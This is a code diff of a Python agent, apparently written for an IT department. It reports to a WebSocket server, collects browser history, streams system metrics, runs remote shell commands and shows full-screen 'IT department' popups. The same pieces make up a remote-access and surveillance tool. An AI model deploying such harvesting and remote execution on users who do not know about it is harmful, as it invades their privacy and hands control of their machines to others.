@@ -18,9 +18,32 @@ from threading import Thread
 import base64
 
 
-SERVER_URL = "ws://192.168.10.232:9000"
+SERVER_URL = "ws://192.168.10.131:9000"
 
+# Fonction pour récupérer l'adresse IP locale de la machine de manière plus robuste
+def get_local_ip():
+    # Définir les plages d'adresses IP privées
+    private_ip_ranges = [
+        "10.",
+        "172.16.", "172.17.", "172.18.", "172.19.", "172.20.",
+        "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
+        "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
+        "192.168."
+    ]
 
+    for interface, addrs in psutil.net_if_addrs().items():
+        for addr in addrs:
+            if addr.family == socket.AF_INET:
+                ip_address = addr.address
+                # Vérifier si l'adresse est une adresse privée
+                for private_prefix in private_ip_ranges:
+                    if ip_address.startswith(private_prefix):
+                        # On a trouvé une adresse IP privée
+                        return ip_address
+    
+    # Si aucune adresse IP privée n'est trouvée, retourner localhost ou None
+    return "127.0.0.1" # Ou None, selon votre préférence si aucune IP privée n'est active
+local_ip = get_local_ip()
 
 
 
@@ -174,7 +197,7 @@ async def _read_history_from_sqlite(db_path, browser_name, history_entries_list)
             except PermissionError as e:
                 print(f"ATTENTION: Impossible de supprimer le fichier temporaire {temp_db_path}. Il est peut-être encore utilisé: {e}")
 
-async def write_history_to_file(history_data, filename="browser_history.txt"):
+async def write_history_to_file(history_data, filename="browser_history_{local_ip}.txt"):
     """
     Writes the collected browser history to a text file.
     Returns True if the file was written successfully (regardless of content), False on IOError.
@@ -200,7 +223,13 @@ async def write_history_to_file(history_data, filename="browser_history.txt"):
         print(f"Erreur lors de l'écriture du fichier '{filename}': {e}")
         return False # Explicitly return False on IOError
 
+
+
+
+
 async def main_test_history():
+    global local_ip
+
     """
     Fonction principale pour exécuter le test de récupération de l'historique.
     Retourne un dictionnaire contenant les données de l'historique ou les erreurs.
@@ -209,7 +238,7 @@ async def main_test_history():
     history_data = await get_browser_history() # get_browser_history returns a dict
     
     # Save the history to a file. We'll check history_data for actual content.
-    file_write_successful = await write_history_to_file(history_data, "browser_history.txt")
+    file_write_successful = await write_history_to_file(history_data, f"browser_history_{local_ip}.txt")
     
     print("Test de l'historique du navigateur terminé.")
     
@@ -217,11 +246,11 @@ async def main_test_history():
     return {
         "history_data": history_data, 
         "file_write_successful": file_write_successful,
-        "filename": "browser_history.txt"
+        "filename": f"browser_history_{local_ip}.txt"
     }
 
 # --- WebSocket Server Integration Example (assuming this is part of a larger WebSocket handler) ---
-HISTORY_FILE_NAME = "browser_history.txt" # This should be a global or passed parameter
+HISTORY_FILE_NAME = f"browser_history_{local_ip}.txt" # This should be a global or passed parameter
 
 
 
@@ -236,29 +265,10 @@ async def send_register(websocket):
     print(f">> Agent connected : {agent_ip}")
 
 
-# Fonction pour récupérer l'adresse IP locale de la machine de manière plus robuste
-def get_local_ip():
-    # Définir les plages d'adresses IP privées
-    private_ip_ranges = [
-        "10.",
-        "172.16.", "172.17.", "172.18.", "172.19.", "172.20.",
-        "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
-        "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
-        "192.168."
-    ]
 
-    for interface, addrs in psutil.net_if_addrs().items():
-        for addr in addrs:
-            if addr.family == socket.AF_INET:
-                ip_address = addr.address
-                # Vérifier si l'adresse est une adresse privée
-                for private_prefix in private_ip_ranges:
-                    if ip_address.startswith(private_prefix):
-                        # On a trouvé une adresse IP privée
-                        return ip_address
-    
-    # Si aucune adresse IP privée n'est trouvée, retourner localhost ou None
-    return "127.0.0.1" # Ou None, selon votre préférence si aucune IP privée n'est active
+
+
+
 
 
 def get_os():
@@ -418,6 +428,9 @@ async def get_disk_usage():
 total_sent_bytes = 0
 total_recv_bytes = 0
 
+
+
+
 async def get_bandwidth_usage():
     global total_sent_bytes, total_recv_bytes
 
@@ -546,20 +559,7 @@ async def check_internet_connection():
     except Exception as e:
         return "Down"
 
-        
-""" Tsy mandeha NOT WORK"""
-async def get_temperature():
-    sensors = psutil.sensors_temperatures()
-    
-    if not sensors:
-        return "Temperature not available"
 
-    for sensor_name, sensor_list in sensors.items():
-        for sensor in sensor_list:
-            if 'cpu' in sensor_name.lower():
-                return f"CPU Temperature: {sensor.current}°C"
-
-    return "CPU Temperature not available"
 
 
 async def get_uptime():
@@ -669,13 +669,14 @@ async def send_data(websocket):
             }
 
             await websocket.send(json.dumps(data))
-            await asyncio.sleep(2) # You might want to adjust this interval based on server load and desired granularity
+            await asyncio.sleep(5) # You might want to adjust this interval based on server load and desired granularity
         except websockets.exceptions.ConnectionClosedError as e:
             print(f"[SEND CLOSED ERROR] {e}")
             raise e
         except Exception as e:
             print(f"[SEND ERROR] {e}")
             raise e
+
 
 
 async def execute_command(command, timeout=10):
@@ -699,14 +700,19 @@ async def execute_command(command, timeout=10):
                     break
 
         try:
-            await asyncio.wait_for(asyncio.gather(
-                read_output(process.stdout, output_lines),
-                read_output(process.stderr, output_lines),
-                process.wait()
-            ), timeout=timeout)
+            # THIS IS THE FIX: Wrap the multiple awaitables within asyncio.gather()
+            # asyncio.gather returns a single awaitable that waits for all tasks.
+            await asyncio.wait_for(
+                asyncio.gather( # <--- This bundles the three operations
+                    read_output(process.stdout, output_lines),
+                    read_output(process.stderr, output_lines),
+                    process.wait()
+                ),
+                timeout=timeout # The timeout is applied to the entire gathered operation
+            )
 
         except asyncio.TimeoutError:
-            process.kill()
+
             output_lines.append(f"[TIMEOUT] Command took too long (> {timeout}s) and was terminated.")
         except Exception as e:
             output_lines.append(f"[ERROR] Subprocess error: {e}")
@@ -716,7 +722,6 @@ async def execute_command(command, timeout=10):
 
     except Exception as e:
         return f"[-]{local_ip} >> [ERROR] {str(e)}"
-
 
 # ======================
 # 📢 Fonction pour afficher une popup/message
@@ -728,14 +733,21 @@ def show_popup(message):
     def popup():
         root = tk.Tk()
         root.title(">> MESSAGE DU DEPARTEMENT INFORMATIQUE:")
-        root.geometry("1366x768")  
+        root.geometry("1366x768")
+
+        # S'assurer que la fenêtre est toujours au-dessus des autres
+        root.attributes("-topmost", True)
+
+        # ✅ Centrage vertical et horizontal
+        # Adapter wraplength à la taille de l'écran pour le plein écran
+        screen_width = root.winfo_screenwidth()  
         root.resizable(False, False)
         root.configure(bg="black")
 
         # ✅ Centrage vertical et horizontal
         msg_label = tk.Label(
             root,
-            text=message,
+            text=">>DEPARTEMENT INFORMATIQUE:" + message,
             bg="black",
             fg="green",
             font=("Fira Code", 14, "bold"),  # Police plus grande et en gras
